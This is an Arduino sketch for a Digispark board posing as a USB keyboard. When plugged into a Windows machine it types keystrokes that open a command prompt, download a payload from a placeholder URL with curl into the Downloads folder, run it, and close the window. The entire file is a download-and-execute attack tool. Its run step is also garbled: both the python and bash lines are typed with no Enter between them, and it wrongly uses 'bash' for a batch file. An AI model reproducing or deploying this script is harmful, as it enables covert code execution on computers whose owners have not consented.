#include <DigiKeyboard.h>

void setup() {
  
  DigiKeyboard.delay(2000);
  // Open the Run dialog (Windows + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  // Type 'cmd' and press Enter to open Command Prompt
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd %userprofile%\\Downloads");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("curl -O <your payload url>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  // *Note*
  // if your payload is written in python, then
  DigiKeyboard.print("python <payload name>");
  // if your payload is a bat, then
  DigiKeyboard.print("bash <payload name>");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void loop() {
 while (1) {
    DigiKeyboard.delay(500);
  }
}
